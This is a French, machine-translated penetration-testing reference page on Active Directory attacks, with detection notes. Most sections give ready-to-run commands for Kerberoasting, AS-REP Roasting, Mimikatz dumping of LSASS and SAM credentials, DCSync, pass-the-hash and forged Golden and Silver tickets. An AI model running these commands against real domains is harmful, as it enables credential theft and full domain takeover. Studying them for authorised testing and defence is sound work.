---
title: "Attaques Active Directory"
category: techniques
tags: [security, active-directory, kerberos, mimikatz, bloodhound, pentesting]
level: 3
source_sha256: 9247c2255453c4a0d5cae1a3ce0f40fc58a380b5f5a8da4856c87f7b08c7bd53
translation: machine
translated_at: '2026-10-24'
---
# Attaques Active Directory {#active-directory-attacks}

Techniques d'attaque sur Active Directory : énumération LDAP, analyse des chemins d'attaque avec BloodHound, Kerberoasting, AS-REP Roasting, Pass-the-Hash/Ticket, Golden/Silver Tickets, DCSync et récupération d'identifiants avec Mimikatz.

## Faits clés {#key-facts}
- BloodHound visualise le chemin le plus court vers Domain Admin, un outil indispensable pour les tests d'intrusion AD
- Le Kerberoasting cible les comptes de service dotés de SPN et de mots de passe faibles
- Golden Ticket = TGT forgé accordant un accès illimité au domaine ; il survit aux réinitialisations de mot de passe (sauf à la double réinitialisation de KRBTGT)
- DCSync nécessite la permission Replicating Directory Changes (Domain Admins, comptes machine des DC)
- Mimikatz extrait les mots de passe en clair de la mémoire de LSASS (si WDigest est activé)

## Énumération LDAP {#ldap-enumeration}
```bash
# ldapsearch
ldapsearch -x -H ldap://dc01.corp.local -b "dc=corp,dc=local" \
  -s sub "(objectClass=user)"

# BloodHound data collection
bloodhound-python -c All -u user -p password -d corp.local -ns 10.0.0.1
# Import into BloodHound GUI -> "Shortest Path to Domain Admin"
```

BloodHound cartographie les utilisateurs, groupes, ordinateurs, sessions, ACL et relations d'approbation. Il identifie des chemins d'attaque invisibles à une analyse manuelle.

## Kerberoasting {#kerberoasting}
Extraire les tickets TGS des comptes de service et les casser hors ligne :
```bash
# Impacket
GetUserSPNs.py corp.local/user:password -dc-ip 10.0.0.1 -request

# Crack with hashcat
hashcat -m 13100 tgs_hashes.txt wordlist.txt
```
Cibles : les comptes de service dotés de SPN et de mots de passe faibles. Tout utilisateur du domaine peut demander un ticket TGS pour n'importe quel SPN.

## AS-REP Roasting {#as-rep-roasting}
Cibler les comptes dont l'option « Ne pas exiger la pré-authentification Kerberos » est activée :
```bash
GetNPUsers.py corp.local/ -dc-ip 10.0.0.1 -usersfile users.txt -no-pass
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

## Récupération d'identifiants avec Mimikatz {#credential-harvesting-with-mimikatz}
```sql
privilege::debug                        # Get debug privilege
sekurlsa::logonpasswords               # Dump cleartext passwords from LSASS
sekurlsa::wdigest                      # WDigest passwords
lsadump::sam                           # Dump local SAM database
lsadump::dcsync /user:Administrator    # DCSync attack
lsadump::dcsync /domain:corp.local /all # All domain hashes
```

## Pass-the-Hash (PtH) {#pass-the-hash-pth}
S'authentifier avec un hash NTLM sans connaître le mot de passe :
```bash
# Impacket
psexec.py -hashes :NTLM_HASH Administrator@10.0.0.1
wmiexec.py -hashes :NTLM_HASH Administrator@10.0.0.1
```

## Pass-the-Ticket (PtT) {#pass-the-ticket-ptt}
```python
# Export ticket from memory (Mimikatz)
kerberos::list /export
# Import on another machine
kerberos::ptt ticket.kirbi
```

## Golden Ticket {#golden-ticket}
TGT forgé disposant des privilèges de domain admin. Nécessite le hash NTLM de KRBTGT et le SID du domaine :
```bash
kerberos::golden /user:FakeAdmin /domain:corp.local \
  /sid:S-1-5-21-... /krbtgt:HASH /ptt
```
- Accorde un accès illimité au domaine
- Valide 10 ans par défaut
- Survit à toutes les réinitialisations de mot de passe, sauf à la double réinitialisation de KRBTGT (réinitialisation deux fois, à 12 heures d'intervalle minimum)

## Silver Ticket {#silver-ticket}
TGS forgé pour un service spécifique (ne contacte pas le KDC) :
```bash
kerberos::golden /user:FakeUser /domain:corp.local \
  /sid:S-1-5-21-... /target:server.corp.local \
  /service:cifs /rc4:SERVICE_HASH /ptt
```

## DCSync {#dcsync}
Répliquer les données du contrôleur de domaine pour extraire tous les hashes de mots de passe :
```bash
secretsdump.py corp.local/admin:password@10.0.0.1
```
Prérequis : la permission Replicating Directory Changes (Domain Admins et comptes machine des DC par défaut).

## Référence rapide de la structure AD {#ad-structure-quick-reference}
- **Forêt** - frontière de confiance de plus haut niveau
- **Domaine** - frontière administrative au sein de la forêt
- **UO** - conteneur d'organisation, cible de liaison des GPO
- **Relations d'approbation** - relations entre domaines (unidirectionnelles, bidirectionnelles, transitives)
- **GPO** - Group Policy Objects, appliquées de manière hiérarchique : Local -> Site -> Domaine -> UO

## Pièges courants {#gotchas}
- Le Kerberoasting est indétectable par défaut ; il n'est visible que si l'audit des requêtes TGS est activé (Event ID 4769)
- La détection d'un Golden Ticket nécessite la surveillance des anomalies de TGT (event ID 4768 avec un type de chiffrement inattendu)
- Le Pass-the-Hash fonctionne même avec NTLM désactivé si des hashes sont en cache
- La collecte de données BloodHound génère elle-même des requêtes LDAP détectables
- Les comptes de service ont souvent des privilèges Domain Admin et des mots de passe sans expiration : ce sont des cibles de choix
- Un DCSync réalisé depuis le compte machine d'un DC compromis ressemble à un trafic de réplication légitime, ce qui le rend très difficile à détecter

## Voir aussi {#see-also}
- [[authentication-and-authorization]] - Détails du protocole Kerberos
- [[privilege-escalation-techniques]] - Élévation de privilèges locale avant les attaques de domaine
- [[windows-security-and-powershell]] - Event IDs Windows, registre, durcissement
- [[penetration-testing-methodology]] - Déroulement complet du test d'intrusion
